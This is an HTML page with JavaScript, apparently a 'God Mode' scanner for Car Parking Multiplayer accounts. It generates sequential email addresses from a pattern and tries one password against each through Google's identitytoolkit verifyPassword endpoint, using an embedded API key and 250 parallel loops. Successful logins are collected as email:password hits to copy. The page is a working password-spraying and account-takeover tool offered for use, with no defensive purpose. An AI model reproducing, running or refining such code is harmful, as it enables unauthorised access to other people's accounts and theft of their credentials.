<!DOCTYPE html>
<html>
<head>
    <title>CPM God Mode V2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 10px; margin: 0; }
        .box { max-width: 500px; margin: auto; border: 2px solid #ff0000; padding: 20px; box-shadow: 0 0 25px #ff0000; border-radius: 15px; background: #050505; }
        h1 { font-size: 22px; text-shadow: 0 0 10px #ff0000; margin-bottom: 20px; letter-spacing: 2px; }
        
        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #333; color: #fff; font-size: 16px; border-radius: 8px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #ff0000; }
        
        .btn-ignite { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; box-shadow: 0 0 15px #ff0000; transition: 0.2s; }
        .btn-ignite:active { transform: scale(0.95); }
        
        .stats { display: flex; justify-content: space-around; margin: 15px 0; background: #111; padding: 15px; border-radius: 8px; border: 1px solid #222; }
        .stats b { font-size: 22px; color: #fff; display: block; }
        .label { font-size: 11px; color: #888; text-transform: uppercase; }

        #res { width: 100%; height: 220px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin-top: 15px; padding: 10px; font-size: 13px; font-family: monospace; box-sizing: border-box; border-radius: 5px; }
        
        .copy-btn { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; font-size: 14px; }
    </style>
</head>
<body>

<div class="box">
    <h1>🔥 GOD MODE SCAN V2</h1>
    
    <input type="text" id="fmt" placeholder="Format: cpm_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Password to check">
    
    <button class="btn-ignite" id="go" onclick="godScan()">⚡ START GOD SPEED</button>

    <div class="stats">
        <div><span class="label">Checked</span><b id="c">0</b></div>
        <div><span class="label">Found</span><b id="f" style="color: #00ff00;">0</b></div>
    </div>

    <p style="font-size: 11px; color: #00ff00; text-align: left; margin: 0;">💎 RESULTS (Email:Pass):</p>
    <textarea id="res" readonly placeholder="Hits will appear here..."></textarea>
    
    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL HITS</button>
</div>

<script>
    let isRunning = false;
    let checked = 0;
    let found = 0;
    let index = 0;

    async function godScan() {
        if (isRunning) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Enter Format & Password!");

        isRunning = true;
        document.getElementById('go').innerText = "🛑 STOP EMERGENCY";
        document.getElementById('go').style.background = "#555";
        document.getElementById('go').style.boxShadow = "none";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- GOD SPEED (500 Threads) ---
        let threads = 250; // ഒരേസമയം 250 എണ്ണം വീതം തുടർച്ചയായി അയക്കും (500 Acc/sec കിട്ടാൻ)

        async function engine() {
            while (isRunning && index < max) {
                let current = index++;
                let num = current.toString().padStart(digits, '0');
                let email = fmt.replace(/\{(\d+)\}/, num);
                
                check(email, pwd, key);
                
                checked++;
                if (checked % 25 === 0) document.getElementById('c').innerText = checked;
                
                // ചെറിയ ഡിലേ സ്പീഡ് ബാലൻസ് ചെയ്യാൻ
                if (checked % 50 === 0) await new Promise(r => setTimeout(r, 10));
            }
        }

        for (let i = 0; i < threads; i++) {
            engine();
        }
    }

    async function check(em, pw, k) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let d = await r.json();
            if (d && d.idToken) {
                found++;
                document.getElementById('f').innerText = found;
                // email:pass ഫോർമാറ്റിൽ റിസൾട്ട് വരുന്നു
                document.getElementById('res').value += em + ":" + pw + "\n";
                document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
            }
        } catch (e) {}
    }

    function copyHits() {
        let t = document.getElementById('res');
        if (!t.value) return alert("Nothing to copy!");
        t.select();
        document.execCommand('copy');
        alert("Found accounts copied to clipboard!");
    }
</script>

</body>
</html>
